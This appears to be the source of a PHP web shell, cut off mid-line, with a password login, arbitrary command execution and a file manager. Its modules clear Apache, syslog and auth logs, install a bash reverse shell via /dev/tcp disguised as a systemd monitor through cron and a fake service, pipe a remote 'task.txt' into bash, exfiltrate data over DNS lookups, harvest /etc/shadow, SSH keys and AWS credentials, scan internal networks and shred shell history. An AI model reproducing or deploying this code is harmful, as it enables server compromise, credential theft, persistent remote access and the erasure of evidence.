<?php
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
ini_set('error_log', '/dev/null');

session_start();
header_remove('X-Powered-By');

// Config
$USERS = [
    'nemesis' => password_hash('admin123', PASSWORD_DEFAULT),
    'wargasipil'   => password_hash('cyber2024', PASSWORD_DEFAULT),
];
$MAX_ATTEMPTS    = 5;
$LOCKOUT_TIME    = 300;
$SESSION_TIMEOUT = 1800;
$IP_WHITELIST    = [];
$RATE_LIMITS     = ['exec'=>60,'deepsearch'=>5,'portscan'=>3];

// IP Whitelist
if (!empty($IP_WHITELIST) && !in_array($_SERVER['REMOTE_ADDR'], $IP_WHITELIST)) {
    http_response_code(403); die('403 Forbidden');
}

// Session timeout + fingerprint
if (!empty($_SESSION['auth'])) {
    if (time() - ($_SESSION['last_active'] ?? 0) > $SESSION_TIMEOUT) {
        session_destroy(); header('Location: ' . $_SERVER['REQUEST_URI']); exit;
    }
    $fp = hash('sha256', ($_SERVER['HTTP_USER_AGENT'] ?? '') . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? ''));
    if (isset($_SESSION['fp']) && $_SESSION['fp'] !== $fp) {
        session_destroy(); header('Location: ' . $_SERVER['REQUEST_URI']); exit;
    }
    $_SESSION['fp'] = $fp;
    $_SESSION['last_active'] = time();
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?')); exit;
}

// CSRF
if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));

// Login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_user'])) {
    $ip  = $_SERVER['REMOTE_ADDR'];
    $att = $_SESSION['login_attempts'][$ip] ?? 0;
    $lat = $_SESSION['last_attempt_time'][$ip] ?? 0;
    if ($att >= $MAX_ATTEMPTS && time() - $lat < $LOCKOUT_TIME) {
        $loginErr = 'Locked ' . ceil(($LOCKOUT_TIME - (time() - $lat)) / 60) . ' menit.';
    } else {
        $u = $_POST['login_user'] ?? '';
        $p = $_POST['login_pass'] ?? '';
        if (isset($USERS[$u]) && password_verify($p, $USERS[$u])) {
            session_regenerate_id(true);
            $_SESSION = [
                'auth' => true, 'user' => $u, 'cwd' => getcwd(),
                'history' => [], 'activity_log' => [],
                'last_active' => time(), 'csrf' => bin2hex(random_bytes(32)),
                'fp' => hash('sha256', ($_SERVER['HTTP_USER_AGENT'] ?? '') . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '')),
                'aliases' => ['ll' => 'ls -la', 'la' => 'ls -a', 'cls' => 'clear', 'goto' => 'cd'],
                'pinned' => [], 'monitor_snap' => [],
            ];
            $_SESSION['activity_log'][] = ['time' => date('H:i:s'), 'user' => $u, 'action' => 'LOGIN', 'ip' => $ip];
            unset($_SESSION['login_attempts'][$ip]);
            header('Location: ' . $_SERVER['REQUEST_URI']); exit;
        } else {
            $_SESSION['login_attempts'][$ip] = $att + 1;
            $_SESSION['last_attempt_time'][$ip] = time();
            $loginErr = 'Salah! Sisa: ' . ($MAX_ATTEMPTS - $_SESSION['login_attempts'][$ip]) . 'x';
        }
    }
}

// ADVANCED MODULES - Stealth, Persistence, Resilience, Lateral, Cleanup
define('ADV_LOG_PATH', '/tmp/xyra_adv.log');

class AdvShell {
    public static function log($mod, $act, $dat=[]) {
        $entry = ['ts'=>date('Y-m-d H:i:s'),'mod'=>$mod,'act'=>$act,'usr'=>$_SESSION['user']??'unknown','ip'=>$_SERVER['REMOTE_ADDR'],'dat'=>$dat];
        @file_put_contents(ADV_LOG_PATH, json_encode($entry)."\n", FILE_APPEND);
    }
    // STEALTH: disable bash history, redirect stderr to /dev/null
    public static function exec($cmd) {
        return @shell_exec('unset HISTFILE; set +o history; ' . $cmd . ' 2>/dev/null');
    }
}

class StealthModule {
    public function evasion() {
        AdvShell::exec('echo "" > /var/log/apache2/access.log');
        AdvShell::exec('echo "" > /var/log/apache2/error.log');
        AdvShell::exec('echo "" > /var/log/php-fpm.log');
        AdvShell::exec('echo "" > /var/log/syslog');
        ini_set('log_errors', 0);
        ini_set('display_errors', 0);
        error_reporting(0);
        AdvShell::log('Stealth', 'EVASION');
        return ['ok'=>true, 'msg'=>'Logs cleared + error reporting disabled'];
    }
    public function encrypt($msg, $key=null) {
        $key = $key ?: hash('sha256', 'default-key', true);
        if(strlen($key)<32) $key = hash('sha256', $key, true);
        $iv = openssl_random_pseudo_bytes(16);
        $encrypted = openssl_encrypt(is_array($msg)?json_encode($msg):$msg,'AES-256-CBC',$key,OPENSSL_RAW_DATA,$iv);
        $payload = base64_encode($iv.$encrypted);
        AdvShell::log('Stealth', 'ENCRYPT', ['size'=>strlen($payload)]);
        return ['payload'=>$payload];
    }
    public function decrypt($payload, $key=null) {
        $key = $key ?: hash('sha256', 'default-key', true);
        if(strlen($key)<32) $key = hash('sha256', $key, true);
        $data = base64_decode($payload);
        $iv = substr($data, 0, 16);
        $encrypted = substr($data, 16);
        $decrypted = openssl_decrypt($encrypted,'AES-256-CBC',$key,OPENSSL_RAW_DATA,$iv);
        AdvShell::log('Stealth', 'DECRYPT');
        return json_decode($decrypted, true) ?: ['raw'=>$decrypted];
    }
}

class PersistenceModule {
    public function reverse($ip, $port, $interval=300) {
        if(!filter_var($ip, FILTER_VALIDATE_IP)) return ['error'=>'Invalid IP'];
        $script = "#!/bin/bash\nwhile true; do\n  bash -i >& /dev/tcp/$ip/$port 0>&1 2>/dev/null\n  sleep $interval\ndone\n";
        @file_put_contents('/usr/lib/.systemd-monitor.sh', $script);
        @chmod('/usr/lib/.systemd-monitor.sh', 0755);
        $cron = "* * * * * /usr/lib/.systemd-monitor.sh > /dev/null 2>&1";
        AdvShell::exec("(crontab -l 2>/dev/null; echo '$cron') | crontab -");
        $service = "[Unit]\nDescription=System Monitor\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/lib/.systemd-monitor.sh\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\n";
        @file_put_contents('/etc/systemd/system/sysmon.service', $service);
        AdvShell::exec('systemctl daemon-reload && systemctl enable sysmon.service 2>/dev/null');
        AdvShell::log('Persistence', 'REVERSE', ['ip'=>$ip,'port'=>$port]);
        return ['ok'=>true, 'msg'=>'Installed: cron + systemd'];
    }
    public function cron($cmd, $schedule='*/10') {
        if(empty($cmd)) return ['error'=>'No command'];
        if(!preg_match('/^[0-9*\/,\-\s]+$/', $schedule)) return ['error'=>'Invalid schedule'];
        $cron = "$schedule * * * * $cmd > /dev/null 2>&1";
        AdvShell::exec("(crontab -l 2>/dev/null; echo '$cron') | crontab -");
        AdvShell::log('Persistence', 'CRON', ['schedule'=>$schedule]);
        return ['ok'=>true];
    }
    public function deadrop($url) {
        if(!filter_var($url, FILTER_VALIDATE_URL)) return ['error'=>'Invalid URL'];
        $cmd = "curl -s $url/task.txt 2>/dev/null | bash 2>/dev/null";
        return $this->cron($cmd, '*/10');
    }
}

class ResilienceModule {
    public function dns($data, $domain='example.com') {
        $encoded = bin2hex(gzcompress($data));
        $chunks = str_split($encoded, 30);
        foreach($chunks as $i=>$chunk) {
            AdvShell::exec("nslookup $chunk.$i.exfil.$domain 8.8.8.8 2>/dev/null");
            usleep(100000);
        }
        AdvShell::log('Resilience', 'DNS_TUNNEL', ['chunks'=>count($chunks)]);
        return ['ok'=>true, 'chunks'=>count($chunks)];
    }
    public function fragment($data, $size=100) {
        $chunks = str_split($data, $size);
        foreach($chunks as $i=>$chunk) {
            usleep(rand(50, 200)*1000);
        }
        AdvShell::log('Resilience', 'FRAGMENT', ['chunks'=>count($chunks)]);
        return ['ok'=>true, 'fragments'=>count($chunks)];
    }
}

class LateralModule {
    public function harvest() {
        $creds = [
            'passwd'=>@file_get_contents('/etc/passwd'),
            'shadow'=>@file_get_contents('/etc/shadow'),
            'ssh_keys'=>[],
            'bash_history'=>@file_get_contents('~/.bash_history'),
            'env'=>AdvShell::exec('env 2>/dev/null'),
            'aws'=>@file_get_contents('~/.aws/credentials'),
        ];
        foreach(glob('/home/*/.ssh/id_*') as $key) {
            $creds['ssh_keys'][] = ['path'=>$key, 'size'=>@filesize($key)];
        }
        AdvShell::log('Lateral', 'HARVEST');
        return array_filter($creds);
    }
    public function scan($network='192.168.1.0/24', $ports='22,3306,5432') {
        if(!preg_match('/^[0-9.\/]+$/', $network)) return ['error'=>'Invalid network'];
        $result = AdvShell::exec("nmap -p$ports -Pn --open $network -oG - 2>/dev/null | grep open");
        AdvShell::log('Lateral', 'SCAN', ['network'=>$network]);
        return ['result'=>$result];
    }
}

class CleanupModule {
    public function logs() {
        $files = ['/var/log/apache2/access.log','/var/log/apache2/error.log','/var/log/nginx/access.log','/var/log/nginx/error.log','/var/log/syslog','/var/log/auth.log','/var/log/php-fpm.log'];
        $cleaned = 0;
        foreach($files as $f) {
            if(@is_writable($f)) { @file_put_contents($f, ''); $cleaned++; }
        }
        AdvShell::log('Cleanup', 'LOGS');
        return ['ok'=>true, 'cleaned'=>$cleaned];
    }
    public function history() {
        AdvShell::exec('history -c');
        AdvShell::exec('history -w /dev/null');
        @file_put_contents('~/.bash_history', '');
        AdvShell::exec('shred ~/.bash_history 2>/dev/null');
        AdvShell::log('Cleanup', 'HISTORY');
        return ['ok'=>true];
    }
    public function file($path) {
        if(empty($path)) return ['error'=>'No path'];
        if(strpos($path, '/etc/')===0) return ['error'=>'Protected'];
        if(@unlink($path)) {
            AdvShell::log('Cleanup', 'FILE', ['path'=>$path]);
            return ['ok'=>true];
        }
        return ['error'=>'Failed'];
    }
}

// Helpers
function esc($s){return htmlspecialchars((string)$s,ENT_QUOTES,'UTF-8');}
function resolveFile($raw,$cwd){return realpath($raw)?:realpath($cwd.'/'.$raw)?:realpath($cwd.'/'.basename($raw));}
function checkCSRF(){if(($_POST['csrf']??'')!==($_SESSION['csrf']??'x')){echo json_encode(['error'=>'CSRF']);exit;}}
function rateLimit($action){
    global $RATE_LIMITS; if(!isset($RATE_LIMITS[$action]))return;
    $now=time();$hits=array_filter($_SESSION['rl_'.$action]??[],fn($t)=>$now-$t<60);
    if(count($hits)>=$RATE_LIMITS[$action]){echo json_encode(['out'=>"Rate limit: tunggu sebentar.",'cwd'=>$_SESSION['cwd']]);exit;}
    $hits[]=$now;$_SESSION['rl_'.$action]=array_values($hits);
}

// AJAX
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $cwd    = &$_SESSION['cwd'];
    $his    = &$_SESSION['history'];
    $log    = fn($a) => $_SESSION['activity_log'][] = ['time'=>date('H:i:s'),'user'=>$_SESSION['user'],'action'=>$a,'ip'=>$_SERVER['REMOTE_ADDR']];
    checkCSRF();

    if ($action==='exec') {
        rateLimit('exec');
        $raw=trim($_POST['cmd']??'');
        if($raw===''){echo json_encode(['out'=>'','cwd'=>$cwd]);exit;}
        $his[]=$raw;if(count($his)>500)array_shift($his);$log('CMD: '.$raw);
        $aliases=$_SESSION['aliases']??[];$pts=explode(' ',$raw,2);
        if(isset($aliases[$pts[0]]))$raw=$aliases[$pts[0]].(isset($pts[1])?' '.$pts[1]:'');
        if(preg_match('/^cd\s*(.*)?$/',$raw,$m)){$t=trim($m[1]??'');if($t===''||$t==='~')$t=getenv('HOME')?:'/';$new=realpath($cwd.DIRECTORY_SEPARATOR.$t)?:realpath($t);if($new&&is_dir($new)){$cwd=$new;echo json_encode(['out'=>'','cwd'=>$cwd]);}else echo json_encode(['out'=>"cd: $t: No such file or directory",'cwd'=>$cwd]);exit;}
        if(in_array($raw,['clear','reset'])){echo json_encode(['out'=>'','cwd'=>$cwd,'clear'=>true]);exit;}
        if($raw==='history'){$lines=array_map(fn($i,$v)=>sprintf('%5d  %s',$i+1,$v),array_keys($his),$his);echo json_encode(['out'=>implode("\n",$lines),'cwd'=>$cwd]);exit;}
        $start=microtime(true);
        $cmd = 'unset HISTFILE; set +o history; cd '.escapeshellarg($cwd).' && '.$raw.' 2>/dev/null';
        $proc=proc_open($cmd,[1=>['pipe','w']],$pipes);
        $out=is_resource($proc)?rtrim(stream_get_contents($pipes[1]),"\n"):'Error';
        if(is_resource($proc)){fclose($pipes[1]);proc_close($proc);}
        echo json_encode(['out'=>$out,'cwd'=>$cwd,'ms'=>round((microtime(true)-$start)*1000)]);exit;
    }

    if ($action==='autocomplete') {
        $partial=$_POST['partial']??'';$tokens=preg_split('/\s+/',$partial);$last=end($tokens);$s=[];
        if(count($tokens)===1){$bi=array_merge(['cd','clear','history','exit','help','goto'],array_keys($_SESSION['aliases']??[]));$ex=[];foreach(explode(':',getenv('PATH')) as $d){if(!is_dir($d))continue;foreach(scandir($d) as $f)if($f[0]!=='.'&&is_executable("$d/$f")&&str_starts_with($f,$last))$ex[]=$f;}$s=array_unique(array_merge(array_filter($bi,fn($b)=>str_starts_with($b,$last)),$ex));}
        else{$base=$last===''?$cwd:(str_starts_with($last,'/')?dirname($last):$cwd.'/'.dirname($last));$pfx=basename($last);if(is_dir($base))foreach(scandir($base) as $f){if($f==='.'||$f==='..') continue;if(str_starts_with($f,$pfx))$s[]=is_dir("$base/$f")?$f.'/':$f;}}
        sort($s);echo json_encode(['suggestions'=>array_values($s),'partial'=>$last]);exit;
    }

    if ($action==='ls') {
        $dir=realpath($_POST['dir']??$cwd)?:$cwd;$items=[];
        if(is_dir($dir))foreach(scandir($dir) as $f){if($f==='.')continue;$fp=$dir.'/'.$f;$id=is_dir($fp);$p=substr(sprintf('%o',fileperms($fp)),-4);$sz=$id?null:filesize($fp);$items[]=['name'=>$f,'type'=>$id?'dir':'file','size'=>$sz,'mtime'=>filemtime($fp),'mtime_str'=>date('d/m H:i',filemtime($fp)),'ext'=>strtolower(pathinfo($f,PATHINFO_EXTENSION)),'perms'=>$p,'writable'=>is_writable($fp),'executable'=>is_executable($fp)];}
        usort($items,fn($a,$b)=>($a['type']==='dir'?0:1)-($b['type']==='dir'?0:1)?:strcmp($a['name'],$b['name']));
        echo json_encode(['items'=>$items,'dir'=>$dir]);exit;
    }

    if ($action==='chmod'){$f=resolveFile($_POST['file']??'',$cwd);$m=octdec($_POST['mode']??'644');if($f&&chmod($f,$m)){$log('CHMOD '.decoct($m).': '.$f);echo json_encode(['ok'=>true,'msg'=>'chmod OK: '.decoct($m)]);}else echo json_encode(['ok'=>false,'msg'=>'chmod gagal']);exit;}
    if ($action==='chmod775'){$raw=$_POST['file']??'';$f=resolveFile($raw,$cwd);if($f&&chmod($f,0775)){$log('CHMOD 775: '.$f);echo json_encode(['ok'=>true,'msg'=>'chmod 775 OK: '.basename($f)]);}else echo json_encode(['ok'=>false,'msg'=>'chmod 775 gagal: '.$raw]);exit;}
    if ($action==='chmod444'){$raw=$_POST['file']??'';$f=resolveFile($raw,$cwd);if($f&&chmod($f,0444)){$log('CHMOD 444: '.$f);echo json_encode(['ok'=>true,'msg'=>'chmod 444 OK: '.basename($f)]);}else echo json_encode(['ok'=>false,'msg'=>'chmod gagal: '.$raw]);exit;}

    if ($action==='clone'){$raw=$_POST['file']??'';$src=resolveFile($raw,$cwd);if($src&&is_file($src)){$i=pathinfo($src);$e=isset($i['extension'])&&$i['extension']!==''?'.'.$i['extension']:'';$dst=$i['dirname'].'/'.$i['filename'].'_copy'.$e;$n=1;while(file_exists($dst)){$dst=$i['dirname'].'/'.$i['filename'].'_copy'.$n.$e;$n++;}if(copy($src,$dst)){$log('CLONE: '.$src);echo json_encode(['ok'=>true,'msg'=>'Cloned: '.basename($dst)]);}else echo json_encode(['ok'=>false,'msg'=>'Gagal']);}else echo json_encode(['ok'=>false,'msg'=>'File tidak ditemukan']);exit;}
    if ($action==='rename'){$src=resolveFile($_POST['file']??'',$cwd);$nn=basename($_POST['newname']??'');if($src&&$nn){$dst=dirname($src).'/'.$nn;if(rename($src,$dst)){$log('RENAME: '.basename($src).' -> '.$nn);echo json_encode(['ok'=>true,'msg'=>'Renamed!']);}else echo json_encode(['ok'=>false,'msg'=>'Gagal']);}else echo json_encode(['ok'=>false,'msg'=>'Invalid']);exit;}
    if ($action==='zip'){$src=resolveFile($_POST['file']??'',$cwd);if($src){$z=$src.'.zip';$out=shell_exec('cd '.escapeshellarg(dirname($src)).' && zip -r '.escapeshellarg($z).' '.escapeshellarg(basename($src)).' 2>&1');$log('ZIP: '.$src);echo json_encode(['ok'=>file_exists($z),'msg'=>file_exists($z)?'Zipped: '.basename($z):$out]);}else echo json_encode(['ok'=>false,'msg'=>'Not found']);exit;}
    if ($action==='unzip'){$src=resolveFile($_POST['file']??'',$cwd);if($src&&is_file($src)){$out=shell_exec('cd '.escapeshellarg(dirname($src)).' && unzip -o '.escapeshellarg($src).' 2>&1');$log('UNZIP: '.$src);echo json_encode(['ok'=>true,'msg'=>'Unzipped','out'=>$out]);}else echo json_encode(['ok'=>false,'msg'=>'Not found']);exit;}
    if ($action==='read'){$raw=$_POST['file']??'';$f=resolveFile($raw,$cwd);if($f&&is_file($f)&&filesize($f)<2*1024*1024)echo json_encode(['ok'=>true,'content'=>file_get_contents($f),'file'=>$f]);else echo json_encode(['ok'=>false,'msg'=>'Tidak bisa buka: '.$raw]);exit;}
    if ($action==='write'){$f=$_POST['file']??'';$r=file_put_contents($f,$_POST['content']??'');$log('WRITE: '.$f);echo json_encode(['ok'=>$r!==false,'msg'=>$r!==false?'Tersimpan!':'Gagal']);exit;}
    if ($action==='diff'){$f1=resolveFile($_POST['file1']??'',$cwd);$f2=resolveFile($_POST['file2']??'',$cwd);if($f1&&$f2&&is_file($f1)&&is_file($f2)){$out=shell_exec('diff '.escapeshellarg($f1).' '.escapeshellarg($f2).' 2>&1')?:'(No differences)';echo json_encode(['ok'=>true,'out'=>$out]);}else echo json_encode(['ok'=>false,'msg'=>'File tidak ditemukan']);exit;}
    if ($action==='delete'){$raw=$_POST['file']??'';$f=resolveFile($raw,$cwd);if($f&&is_file($f)&&unlink($f)){$log('DELETE: '.$f);echo json_encode(['ok'=>true]);}elseif($f&&is_dir($f)&&rmdir($f)){$log('RMDIR: '.$f);echo json_encode(['ok'=>true]);}else echo json_encode(['ok'=>false,'msg'=>'Gagal hapus']);exit;}
    if ($action==='bulk_delete'){$files=json_decode($_POST['files']??'[]',true);$ok=0;$fail=0;foreach($files as $r){$f=resolveFile($r,$cwd);if($f&&is_file($f)&&unlink($f))$ok++;else $fail++;}$log("BULK DEL: {$ok}ok {$fail}fail");echo json_encode(['ok'=>true,'msg'=>"Dihapus: $ok, Gagal: $fail"]);exit;}
    if ($action==='bulk_chmod'){$files=json_decode($_POST['files']??'[]',true);$m=octdec($_POST['mode']??'644');$ok=0;foreach($files as $r){$f=resolveFile($r,$cwd);if($f&&chmod($f,$m))$ok++;}echo json_encode(['ok'=>true,'msg'=>"chmod OK: $ok files"]);exit;}
    if ($action==='mkdir_action'){$n=basename($_POST['name']??'');$r=mkdir($cwd.'/'.$n,0755);if($r)$log('MKDIR: '.$n);echo json_encode(['ok'=>$r]);exit;}
    if ($action==='upload'){if(!isset($_FILES['file'])){echo json_encode(['ok'=>false,'msg'=>'No file']);exit;}$dd=$_POST['dest_dir']??$cwd;$dst=$dd.'/'.basename($_FILES['file']['name']);$ok=move_uploaded_file($_FILES['file']['tmp_name'],$dst);if($ok)$log('UPLOAD: '.basename($dst));echo json_encode($ok?['ok'=>true,'msg'=>'OK: '.basename($dst)]:['ok'=>false,'msg'=>'Gagal']);exit;}
    if ($action==='download'){$raw=$_POST['file']??'';$f=resolveFile($raw,$cwd);if($f&&is_file($f)){header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($f).'"');header('Content-Length: '.filesize($f));readfile($f);}else echo json_encode(['ok'=>false,'msg'=>'Not found']);exit;}

    if ($action==='get_aliases'){echo json_encode(['aliases'=>$_SESSION['aliases']??[]]);exit;}
    if ($action==='set_alias'){$k=preg_replace('/[^a-zA-Z0-9_\-]/','',$_POST['name']??'');$v=$_POST['cmd']??'';if($k&&$v){$_SESSION['aliases'][$k]=$v;echo json_encode(['ok'=>true]);}else echo json_encode(['ok'=>false]);exit;}
    if ($action==='del_alias'){unset($_SESSION['aliases'][$_POST['name']??'']);echo json_encode(['ok'=>true]);exit;}
    if ($action==='get_pins'){echo json_encode(['pins'=>$_SESSION['pinned']??[]]);exit;}
    if ($action==='add_pin'){$cmd=trim($_POST['cmd']??'');if($cmd&&!in_array($cmd,$_SESSION['pinned']??[])){$_SESSION['pinned'][]=$cmd;}echo json_encode(['ok'=>true,'pins'=>$_SESSION['pinned']]);exit;}
    if ($action==='del_pin'){$_SESSION['pinned']=array_values(array_filter($_SESSION['pinned']??[],fn($p)=>$p!==($_POST['cmd']??'')));echo json_encode(['ok'=>true]);exit;}

    if ($action==='whois'){$d=escapeshellarg(preg_replace('/[^a-zA-Z0-9.\-]/','',$_POST['domain']??''));echo json_encode(['out'=>shell_exec("whois $d 2>&1")?:'No result']);exit;}
    if ($action==='reverseip'){$ip=filter_var($_POST['ip']??'',FILTER_VALIDATE_IP)?$_POST['ip']:'';if(!$ip){echo json_encode(['out'=>'IP tidak valid']);exit;}echo json_encode(['out'=>"IP: $ip\nHostname: ".gethostbyaddr($ip)]);exit;}
    if ($action==='portscan'){rateLimit('portscan');$host=preg_replace('/[^a-zA-Z0-9.\-]/','',$_POST['host']??'');$ports=array_map('intval',explode(',',($_POST['ports']??'21,22,80,443,3306,8080')));$results=[];foreach($ports as $port){if($port<1||$port>65535)continue;$conn=@fsockopen($host,$port,$e,$es,1);$results[]=sprintf("%-6s %s",$port,$conn?'● OPEN':'○ closed');if($conn)fclose($conn);}echo json_encode(['out'=>"Scanning: $host\n".implode("\n",$results)]);exit;}
    if ($action==='hashgen'){$s=$_POST['str']??'';$r=[];foreach(['md5','sha1','sha256','sha512','sha384','ripemd160','crc32b'] as $a)$r[]=str_pad($a,12).' : '.hash($a,$s);echo json_encode(['out'=>implode("\n",$r)]);exit;}
    if ($action==='hashid'){$h=trim($_POST['hash']??'');$possible=[];$patterns=['/^[a-f0-9]{32}$/i'=>['MD5','NTLM'],'/^[a-f0-9]{40}$/i'=>['SHA-1','MySQL5'],'/^[a-f0-9]{64}$/i'=>['SHA-256'],'/^[a-f0-9]{128}$/i'=>['SHA-512'],'/^\$2[ayb]\$.{56}$/'=>['bcrypt'],'/^\$6\$.{1,16}\$.{86}$/'=>['SHA-512-Crypt']];foreach($patterns as $pat=>$names)if(preg_match($pat,$h))$possible=array_merge($possible,$names);echo json_encode(['out'=>$possible?'Kemungkinan: '.implode(', ',$possible):'Tidak dikenali (len:'.strlen($h).')']);exit;}
    if ($action==='stringtools'){$s=$_POST['str']??'';$op=$_POST['op']??'';$r=match($op){'b64enc'=>base64_encode($s),'b64dec'=>base64_decode($s),'urlencode'=>urlencode($s),'urldecode'=>urldecode($s),'htmlenc'=>htmlspecialchars($s),'htmldec'=>htmlspecialchars_decode($s),'hexenc'=>bin2hex($s),'hexdec'=>hex2bin($s),'strlen'=>'Panjang: '.strlen($s).' char','wordcount'=>'Kata: '.str_word_count($s),'reverse'=>strrev($s),'upper'=>strtoupper($s),'lower'=>strtolower($s),'md5'=>md5($s),'rot13'=>str_rot13($s),default=>'Unknown'};echo json_encode(['out'=>$r]);exit;}
    if ($action==='cmsdetect'){$url=filter_var($_POST['url']??'',FILTER_VALIDATE_URL);if(!$url){echo json_encode(['out'=>'URL tidak valid']);exit;}$ctx=stream_context_create(['http'=>['timeout'=>5,'user_agent'=>'Mozilla/5.0']]);$html=@file_get_contents($url,false,$ctx)?:'';$headers=$http_response_header??[];$detected=[];if(str_contains($html,'wp-content'))$detected[]='WordPress';if(str_contains($html,'Joomla'))$detected[]='Joomla';if(str_contains($html,'Drupal'))$detected[]='Drupal';if(str_contains($html,'Magento'))$detected[]='Magento';if(str_contains($html,'laravel'))$detected[]='Laravel';$server=array_reduce($headers,fn($c,$h)=>str_starts_with($h,'Server:')?trim(substr($h,7)):$c,'Unknown');echo json_encode(['out'=>"URL: $url\nCMS: ".($detected?implode(', ',$detected):'Tidak terdeteksi')."\nServer: $server"]);exit;}
    if ($action==='disablefunc'){echo json_encode(['out'=>"disable_functions:\n".(ini_get('disable_functions')?:'(none)')."\n\nPHP: ".PHP_VERSION."\nOS: ".php_uname()]);exit;}

    if ($action==='sysinfo'){$info=['PHP'=>PHP_VERSION,'OS'=>php_uname(),'Server'=>$_SERVER['SERVER_SOFTWARE']??'N/A','CWD'=>$cwd,'User'=>get_current_user().' (uid='.getmyuid().')','Host'=>gethostname(),'IP'=>gethostbyname(gethostname()),'Disk Free'=>round(disk_free_space('/')/1073741824,2).' GB','Disk Total'=>round(disk_total_space('/')/1073741824,2).' GB','Memory'=>ini_get('memory_limit'),'Upload Max'=>ini_get('upload_max_filesize'),'Basedir'=>ini_get('open_basedir')?:'-'];echo json_encode(['out'=>implode("\n",array_map(fn($k,$v)=>str_pad($k,12).": $v",array_keys($info),$info))]);exit;}
    if ($action==='stats'){$df=disk_free_space('/');$dt=disk_total_space('/');$ut=@file_get_contents('/proc/uptime')?:'0';$ld=@file_get_contents('/proc/loadavg')?:'N/A';$ex=get_loaded_extensions();sort($ex);$ps=shell_exec('ps aux --no-headers 2>/dev/null | head -15')?:'N/A';echo json_encode(['disk_free'=>$df,'disk_total'=>$dt,'uptime'=>$ut,'load'=>$ld,'extensions'=>$ex,'processes'=>$ps,'php'=>PHP_VERSION]);exit;}

    // Deep tools
    if ($action==='deepsearch'){rateLimit('deepsearch');$query=trim($_POST['query']??'');$dir=realpath($_POST['dir']??$cwd)?:$cwd;$type=$_POST['stype']??'content';$ext=trim($_POST['ext']??'','. ');if(!$query){echo json_encode(['out'=>'Query kosong']);exit;}$results=[];$count=0;$max=200;function dsearch($dir,$query,$type,$ext,&$res,&$cnt,$max){if($cnt>=$max)return;$items=@scandir($dir);if(!$items)return;foreach($items as $f){if($f==='.'||$f==='..')continue;$fp=$dir.'/'.$f;if(is_dir($fp)&&!is_link($fp)){dsearch($fp,$query,$type,$ext,$res,$cnt,$max);continue;}if(!is_file($fp))continue;if($ext&&strtolower(pathinfo($fp,PATHINFO_EXTENSION))!==strtolower($ext))continue;if($type==='name'&&stripos($f,$query)!==false){$res[]='📄 '.$fp;$cnt++;}elseif($type==='content'&&is_readable($fp)&&filesize($fp)<512*1024){$c=@file_get_contents($fp);if($c!==false&&stripos($c,$query)!==false){foreach(explode("\n",$c) as $ln=>$line){if(stripos($line,$query)!==false)$res[]="📄 $fp [L".($ln+1)."]: ".trim(substr($line,0,80));if($cnt++>=$max)return;}}}elseif($type==='perm'){$p=substr(sprintf('%o',fileperms($fp)),-4);if(str_contains($p,$query))$res[]="📄 $fp ($p)";}}}dsearch($dir,$query,$type,$ext,$results,$count,$max);$out=$results?implode("\n",$results):"Tidak ditemukan: '$query'";if($count>=$max)$out.="\n⚠ Dibatasi $max.";echo json_encode(['out'=>$out]);exit;}
    if ($action==='deepscan'){$dir=realpath($_POST['dir']??$cwd)?:$cwd;$maxD=intval($_POST['depth']??3);$res=[];$stats=['dirs'=>0,'files'=>0,'size'=>0,'execs'=>0,'writable'=>0];function dscn($dir,$d,$maxD,&$res,&$stats){if($d>$maxD)return;$items=@scandir($dir);if(!$items)return;$ind=str_repeat('  ',$d);foreach($items as $f){if($f==='.'||$f==='..')continue;$fp=$dir.'/'.$f;$p=substr(sprintf('%o',fileperms($fp)),-4);if(is_dir($fp)&&!is_link($fp)){$stats['dirs']++;$res[]="$ind📁 $f/ ($p)";dscn($fp,$d+1,$maxD,$res,$stats);}elseif(is_file($fp)){$sz=filesize($fp);$stats['files']++;$stats['size']+=$sz;if(is_executable($fp))$stats['execs']++;if(is_writable($fp))$stats['writable']++;$res[]="$ind📄 $f ($p, ".round($sz/1024,1)."KB)";}}}dscn($dir,0,$maxD,$res,$stats);$h="Deep Scan: $dir\nDirs:{$stats['dirs']} Files:{$stats['files']} Total:".round($stats['size']/1048576,2)."MB Exec:{$stats['execs']} Writable:{$stats['writable']}\n".str_repeat('─',50)."\n";echo json_encode(['out'=>$h.implode("\n",$res)]);exit;}
    if ($action==='deepanalysis'){$dir=realpath($_POST['dir']??$cwd)?:$cwd;$extC=[];$largest=[];$oldest=[];$newest=[];$total=0;$totalF=0;function danalyze($dir,&$extC,&$largest,&$oldest,&$newest,&$total,&$totalF){$items=@scandir($dir);if(!$items)return;foreach($items as $f){if($f==='.'||$f==='..')continue;$fp=$dir.'/'.$f;if(is_dir($fp)&&!is_link($fp)){danalyze($fp,$extC,$largest,$oldest,$newest,$total,$totalF);continue;}if(!is_file($fp))continue;$sz=filesize($fp);$mt=filemtime($fp);$ext=strtolower(pathinfo($fp,PATHINFO_EXTENSION))?:'(no ext)';$totalF++;$total+=$sz;$extC[$ext]=($extC[$ext]??0)+1;$largest[]=['path'=>$fp,'size'=>$sz];usort($largest,fn($a,$b)=>$b['size']-$a['size']);if(count($largest)>10)array_pop($largest);$oldest[]=['path'=>$fp,'time'=>$mt];usort($oldest,fn($a,$b)=>$a['time']-$b['time']);if(count($oldest)>5)array_pop($oldest);$newest[]=['path'=>$fp,'time'=>$mt];usort($newest,fn($a,$b)=>$b['time']-$a['time']);if(count($newest)>5)array_pop($newest);}}danalyze($dir,$extC,$largest,$oldest,$newest,$total,$totalF);arsort($extC);$out="═══ Deep Analysis: $dir ═══\nTotal: $totalF files, ".round($total/1048576,2)."MB\n\n── Top Extensions ──\n";$i=0;foreach($extC as $e=>$c){$out.="  .$e: $c\n";if(++$i>=10)break;}$out.="\n── Largest ──\n";foreach($largest as $f)$out.="  ".round($f['size']/1024,1)."KB → ".basename($f['path'])."\n";$out.="\n── Newest ──\n";foreach($newest as $f)$out.="  ".date('Y-m-d H:i',$f['time'])." → 